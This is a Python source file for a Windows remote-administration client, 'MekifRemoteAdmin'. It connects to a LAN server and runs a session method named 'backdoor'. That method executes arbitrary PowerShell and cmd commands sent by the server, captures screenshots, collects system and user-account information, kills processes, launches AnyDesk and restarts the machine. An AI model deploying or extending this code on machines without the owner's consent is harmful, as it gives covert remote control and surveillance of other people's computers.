from datetime import datetime
from threading import Thread
from termcolor import colored
import subprocess
import threading
import random
import socket
import shutil
import psutil
import time
import sys
import os

# TODO: Install Anydesk Silent Mode


class Client:
    def __init__(self, server, main_path, log_path):
        self.log_path = log_path
        self.main_path = main_path
        self.server_host = server[0]
        self.server_port = server[1]
        self.buffer_size = 1024
        self.d = datetime.now()
        self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
        self.current_user = os.getlogin()
        self.hostname = socket.gethostname()
        self.localIP = str(socket.gethostbyname(self.hostname))
        if not os.path.exists(f'{self.main_path}'):
            os.makedirs(self.main_path)

    def connection(self):
        while True:
            time.sleep(1)
            print(colored(f"[i]Connecting to Server: {self.server_host} | Port {self.server_port}...", 'cyan'))
            try:
                soc.connect((self.server_host, self.server_port))

            except (TimeoutError, WindowsError, ConnectionAbortedError, ConnectionResetError) as e:
                print(colored(e, 'red'))
                continue

    def anydeskThread(self):
        return subprocess.call([r"C:\Program Files (x86)\AnyDesk\anydesk.exe"])

    def anydesk(self):
        self.d = datetime.now().replace(microsecond=0)
        self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
        try:
            if os.path.exists(r"C:\Program Files (x86)\AnyDesk\anydesk.exe"):
                anydeskThread = threading.Thread(target=self.anydeskThread, name="Run Anydesk")
                anydeskThread.daemon = True
                anydeskThread.start()
                soc.send("OK".encode())

            else:
                error = "Anydesk not installed."
                soc.send(error.encode())
                return

        except FileNotFoundError:
            print("Anydesk.exe was not found.")
            return

    def install_anydesk(self):
        pass

    def screenshot(self):
        self.logIt(logfile=log_path, debug=True, msg='Starting screenshot()')
        self.logIt(logfile=log_path, debug=True, msg='Configuring file name & path')
        dt = self.get_date()
        self.filename = \
            rf"c:\MekifRemoteAdmin\screenshot {self.hostname} {str(self.localIP)} {dt}.jpg"
        self.logIt(logfile=log_path, debug=True, msg='Define chunk size')
        self.chunk = 40960000
        self.logIt(logfile=log_path, debug=True, msg='Create powershell script file')
        self.path = rf'c:\MekifRemoteAdmin\screenshot.ps1'
        with open(self.path, 'w') as file:
            file.write("Add-Type -AssemblyName System.Windows.Forms\n")
            file.write("Add-Type -AssemblyName System.Drawing\n\n")
            file.write("$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen\n\n")
            file.write("$Width  = $Screen.Width\n")
            file.write("$Height = $Screen.Height\n")
            file.write("$Left = $Screen.Left\n")
            file.write("$Top = $Screen.Top\n\n")
            file.write("$bitmap = New-Object System.Drawing.Bitmap $Width, $Height\n")
            file.write("$graphic = [System.Drawing.Graphics]::FromImage($bitmap)\n")
            file.write("$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)\n\n")
            file.write(rf"$bitmap.Save('{self.filename}')")

        time.sleep(0.2)

        self.logIt(logfile=log_path, debug=True, msg='Running Screenshot script')
        ps = subprocess.Popen(["powershell.exe", rf"{self.path}"], stdout=sys.stdout)
        ps.communicate()
        try:
            # Send filename to server
            self.logIt(logfile=log_path, debug=True, msg='Sending file name to server')
            soc.send(f"{self.filename}".encode())

            # Receive filename Confirmation from the server
            self.logIt(logfile=log_path, debug=True, msg='Waiting for confirmation from server')
            msg = soc.recv(self.chunk).decode()
            self.logIt(logfile=log_path, debug=True, msg=f'Server confirmation: {msg}')
            self.logIt(logfile=log_path, debug=True, msg=f'Get file size')
            length = os.path.getsize(self.filename)
            self.logIt(logfile=log_path, debug=True, msg=f'Send file size to server')
            soc.send(convert_to_bytes(length))

            # Send file content
            self.logIt(logfile=log_path, debug=True, msg=f'Opening file with read bytes attributes ')
            with open(self.filename, 'rb') as img_file:
                img_data = img_file.read(1024)
                self.logIt(logfile=log_path, debug=True, msg=f'Sending file content')
                while img_data:
                    soc.send(img_data)
                    if not img_data:
                        break

                    img_data = img_file.read(1024)

        except ConnectionResetError:
            return False

        # Send Confirmation to server
        self.logIt(logfile=log_path, debug=True, msg=f'Send confirmation')
        soc.send(f"{self.hostname} | {self.localIP}: Screenshot Completed.\n".encode())
        self.logIt(logfile=log_path, debug=True, msg=f'Remove file')
        os.remove(self.filename)
        os.remove(self.path)
        self.logIt(logfile=log_path, debug=True, msg=f'=== End of screenshot() ===')

    def system_information(self):
        def command_to_file():
            try:
                sysinfo = open(self.sifile, 'w')
                sinfo = subprocess.call(['systeminfo'], stdout=sysinfo)
                sysinfo.write("\n")
                allusers = subprocess.call(['net', 'user'], stdout=sysinfo)
                sysinfo.write("\n")
                sysinfo.write("=== Hard Drive Information ===\n")
                hard_drive = subprocess.call(['wmic', 'diskdrive', 'get', 'model,serialNumber,size,mediaType'],
                                             stdout=sysinfo)
                sysinfo.close()

                return True

            except (FileNotFoundError, FileExistsError):
                return False

        def send_file_name():
            try:
                soc.send(f"{self.sifile}".encode())

            except ConnectionResetError:
                return False

        def send_file_size():
            try:
                length = os.path.getsize(self.sifile)
                print(f"SysInfoFile Size: {length}")
                soc.send(convert_to_bytes(length))

                return True

            except ConnectionResetError:
                return False

        def send_file_content():
            try:
                with open(self.sifile, 'rb') as sy_file:
                    sys_data = sy_file.read(1024)
                    while sys_data:
                        soc.send(sys_data)
                        if not sys_data:
                            break

                        sys_data = sy_file.read(1024)

            except (WindowsError, socket.error, FileExistsError, FileNotFoundError):
                return False

        def confirm():
            try:
                msg = soc.recv(1024).decode()
                print(f"@Server: {msg}")
                soc.send(f"{self.hostname} | {self.localIP}: System Information Sent.\n".encode())

            except (WindowsError, socket.error):
                return False

        dt = self.get_date()
        self.sifile = rf"c:\MekifRemoteAdmin\systeminfo {self.hostname} {str(self.localIP)} {dt}.txt"

        command_to_file()
        send_file_name()
        send_file_size()
        send_file_content()
        confirm()
        os.remove(self.sifile)

    def get_date(self):
        d = datetime.now().replace(microsecond=0)
        dt = str(d.strftime("%b %d %Y %I.%M.%S %p"))

        return dt

    def send_file(self, filename):
        def send_file_name():
            try:
                soc.send(filename.encode())
                msg = soc.recv(1024).decode()
                print(msg)
                return True

            except (WindowsError, socket.error):
                return False

        def send_file_size():
            length = os.path.getsize(filename)
            print(f"PSFile Size: {length}")
            try:
                soc.send(convert_to_bytes(length))
                return length

            except (WindowsError, socket.error):
                return False

        def send_file_content():
            try:
                with open(filename, 'rb') as file:
                    data = file.read(1024)
                    while data:
                        soc.send(data)
                        if not data:
                            break

                        data = file.read(1024)

            except (FileNotFoundError, FileExistsError):
                return False

        send_file_name()
        send_file_size()
        send_file_content()

    def execute(self, platform, cmd):
        dt = self.get_date()
        filename = rf"c:\MekifRemoteAdmin\{platform} {self.hostname} {str(self.localIP)} {dt}.txt"

        def run_command():
            if str(platform) == "ps":
                try:
                    with open(filename, 'w') as file:
                        p = subprocess.run(["powershell", "-Command", cmd], stdout=file)

                except FileExistsError:
                    pass

            elif str(platform) == "cmd":
                try:
                    with open(filename, 'w') as file:
                        p = subprocess.run(cmd, stdout=file)

                except FileExistsError:
                    pass

        def send_file_name():
            soc.send(filename.encode())
            msg = soc.recv(1024).decode()
            print(msg)

            return

        def send_file_size():
            length = os.path.getsize(filename)
            print(f"PSFile Size: {length}")
            soc.send(convert_to_bytes(length))

            return length

        def send_file_content():
            try:
                with open(filename, 'rb') as file:
                    data = file.read(1024)
                    while data:
                        soc.send(data)
                        if not data:
                            break

                        data = file.read(1024)

            except (FileNotFoundError, FileExistsError):
                return False

        def confirm():
            msg = soc.recv(1024).decode()
            print(f"@Server: {msg}")
            soc.send(f"{self.hostname} | {self.localIP}: Command: {cmd} Completed.\n".encode())

        run_command()
        self.send_file(filename)
        confirm()
        os.remove(filename)

    def free_style(self):
        dt = self.get_date()
        while True:
            try:
                command = soc.recv(1024).decode()
                if str(command).lower() == "ps":
                    cmd = soc.recv(1024).decode()
                    self.execute("ps", cmd)

                elif str(command).lower() == "cmd":
                    cmd = soc.recv(1024).decode()
                    self.execute("cmd", cmd)

                elif str(command).lower() == "instad":
                    pass

                elif str(command).lower() == "back":
                    msg = "back".encode()
                    soc.send(msg)
                    break

            except (WindowsError, socket.error) as e:
                print(e)
                break

        return

    def tasks(self):
        def command_to_file():
            try:
                tskinfo = open(self.taskfile, 'w')
                sinfo = subprocess.call(['tasklist'], stdout=tskinfo)
                tskinfo.write("\n")
                tskinfo.close()
                return True

            except (FileNotFoundError, FileExistsError):
                dt = self.get_date()
                return False

        def send_file_name():
            try:
                soc.send(f"{self.taskfile}".encode())
                return True

            except (WindowsError, socket.error):
                dt = self.get_date()
                return False

        def print_file_content():
            dt = self.get_date()
            with open(self.taskfile, 'r') as file:
                for line in file.readlines():
                    task_list.append(line)

            for t in task_list:
                print(t)

        def send_file_size():
            dt = self.get_date()
            length = os.path.getsize(self.taskfile)
            print(f"SC Size: {length}")
            try:
                soc.send(convert_to_bytes(length))
                return True

            except (WindowsError, socket.error):
                return False

        def send_file_content():
            with open(self.taskfile, 'rb') as tsk_file:
                tsk_data = tsk_file.read(1024)
                try:
                    while tsk_data:
                        soc.send(tsk_data)
                        if not tsk_data:
                            break

                        tsk_data = tsk_file.read(1024)

                except (WindowsError, socket.error):
                    dt = self.get_date()
                    return False

        def confirm():
            try:
                msg = soc.recv(1024).decode()
                soc.send(f"{self.hostname} | {self.localIP}: Task List Sent.\n".encode())

            except (WindowsError, socket.error):
                dt = self.get_date()
                return False

        def kill():
            # Kill Task
            try:
                kill = soc.recv(1024).decode()
                if str(kill) == "kill":
                    task2kill = soc.recv(1024).decode()
                    os.system(f'taskkill /IM {task2kill} /F')
                    soc.send(f"Task: {task2kill} Killed.".encode())
                    return True

                else:
                    return False

            except (ConnectionResetError, ConnectionAbortedError, ConnectionError):
                return False

        dt = self.get_date()
        self.taskfile = rf"c:\MekifRemoteAdmin\tasks {self.hostname} {str(self.localIP)} {dt}.txt"

        command_to_file()
        send_file_name()
        print_file_content()
        send_file_size()
        send_file_content()
        confirm()
        os.remove(self.taskfile)
        kill()

    def backdoor(self, soc):
        def intro():
            def send_host_name():
                # Send Computer Name to Server
                ident = self.hostname
                try:
                    self.logIt(logfile=log_path, debug=True, msg='Sending self.hostname')
                    soc.send(ident.encode())

                except (WindowsError, socket.error):
                    self.logIt(logfile=log_path, debug=True, msg='Connection Error')
                    return False

            def send_current_user():
                user = self.current_user
                try:
                    self.logIt(logfile=log_path, debug=True, msg=f'Sending current user: {user}')
                    soc.send(user.encode())

                except (WindowsError, socket.error):
                    return False

            def confirm():
                # Wait For Message
                try:
                    self.logIt(logfile=log_path, debug=True, msg='Wait for confirmation from server')
                    message = soc.recv(self.buffer_size).decode()
                    self.logIt(logfile=log_path, debug=True, msg=f'Message from server: {message}')

                except (WindowsError, socket.error):
                    return False

            self.logIt(logfile=log_path, debug=True, msg='Calling send_host_name')
            send_host_name()
            self.logIt(logfile=log_path, debug=True, msg='Calling send_current_user')
            send_current_user()
            self.logIt(logfile=log_path, debug=True, msg='Calling confirm')
            confirm()

        def main_menu():
            self.logIt(logfile=log_path, debug=True, msg='Starting main menu')
            while True:
                try:
                    self.logIt(logfile=log_path, debug=True, msg='Waiting for command')
                    command = soc.recv(self.buffer_size).decode()

                except (ConnectionResetError, ConnectionError,
                        ConnectionAbortedError, WindowsError, socket.error):
                    break

                try:
                    if len(str(command)) == 0:
                        self.logIt(logfile=log_path, debug=True, msg='Connection Lost')
                        break

                    # Freestyle
                    if str(command).lower() == "freestyle":
                        self.logIt(logfile=log_path, debug=True, msg='Calling freestyle')
                        self.free_style()

                    # Vital Signs
                    if str(command).lower() == "alive":
                        self.logIt(logfile=log_path, debug=True, msg='Calling Vital Signs')
                        try:
                            self.logIt(logfile=log_path, debug=True, msg='Answer yes to server')
                            soc.send('yes'.encode())

                        except socket.error:
                            break

                    # Capture Screenshot
                    elif str(command.lower()[:6]) == "screen":
                        self.logIt(logfile=log_path, debug=True, msg='Calling screenshot')
                        self.screenshot()

                    # Get System Information & Users
                    elif str(command.lower()[:2]) == "si":
                        self.logIt(logfile=log_path, debug=True, msg='Calling system information')
                        self.system_information()

                    # Get Last Restart Time
                    elif str(command).lower()[:2] == "lr":
                        self.logIt(logfile=log_path, debug=True, msg='Fetching last restart time')
                        last_reboot = psutil.boot_time()
                        try:
                            self.logIt(logfile=log_path, debug=True, msg='Sending last restart time')
                            soc.send(f"{self.hostname} | {self.localIP}: "
                                     f"{datetime.fromtimestamp(last_reboot).replace(microsecond=0)}".encode())

                            continue

                        except ConnectionResetError:
                            break

                    # Get Current Logged-on User
                    elif str(command).lower()[:4] == "user":
                        try:
                            self.logIt(logfile=log_path, debug=True, msg='Sending current logged user')
                            soc.send(f"{self.hostname} | {self.localIP}: Current User: {self.current_user}.\n".encode())
                            continue

                        except ConnectionResetError:
                            break

                    # Run Anydesk
                    elif str(command.lower()[:7]) == "anydesk":
                        self.logIt(logfile=log_path, debug=True, msg='Calling anydesk')
                        self.anydesk()
                        continue

                    # Task List
                    elif (str(command.lower())[:5]) == "tasks":
                        self.logIt(logfile=log_path, debug=True, msg='Calling tasks')
                        self.tasks()

                    # Restart Machine
                    elif str(command.lower()[:7]) == "restart":
                        self.logIt(logfile=log_path, debug=True, msg='Restarting local station')
                        os.system('shutdown /r /t 1')

                    # Close Connection
                    elif str(command.lower()[:4]) == "exit":
                        self.logIt(logfile=log_path, debug=True, msg='Server closed the connection')
                        soc.settimeout(1)
                        break

                    continue

                except (Exception, socket.error) as err:
                    break

        self.logIt(logfile=log_path, debug=True, msg='Calling intro()')
        intro()
        self.logIt(logfile=log_path, debug=True, msg='Calling main_menu()')
        main_menu()

    def logIt(self, logfile=None, debug=None, msg=''):
        dt = self.get_date()
        if debug:
            print(f"{dt}: {msg}")

        if logfile is not None:
            try:
                if not os.path.exists(logfile):
                    with open(logfile, 'w') as lf:
                        lf.write(f"{dt}: {msg}\n")
                        return True

                else:
                    with open(logfile, 'a') as lf:
                        lf.write(f"{dt}: {msg}\n")
                    return True

            except FileExistsError:
                pass


def convert_to_bytes(no):
    result = bytearray()
    result.append(no & 255)
    for i in range(3):
        no = no >> 8
        result.append(no & 255)
    return result


def bytes_to_number(b):
    res = 0
    for i in range(4):
        res += b[i] << (i * 8)
    return res


if __name__ == "__main__":
    client_version = "1.0.0"
    task_list = []
    mekif_path = r'c:\MekifRemoteAdmin'
    log_path = r'c:\MekifRemoteAdmin\log.txt'
    servers = [('192.168.1.10', 55400)]

    # Start Client
    while True:
        for server in servers:
            client = Client(server, mekif_path, log_path)

            try:
                client.logIt(logfile=log_path, debug=True, msg='Creating Socket')
                soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client.logIt(logfile=log_path, debug=True, msg='Set socket to Reuse address')
                soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                client.logIt(logfile=log_path, debug=True, msg=f'connecting to {server}')
                soc.connect(server)
                client.logIt(logfile=log_path, debug=True, msg=f'Starting backdoor')
                client.backdoor(soc)

            except (WindowsError, socket.error) as e:
                client.logIt(logfile=log_path, debug=True, msg=f'{e}')
                soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                client.logIt(logfile=log_path, debug=True, msg=f'Closing socket')
                soc.close()

        soc = socket.socket()
        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        client.logIt(logfile=log_path, debug=True, msg='Closing socket')
        soc.close()
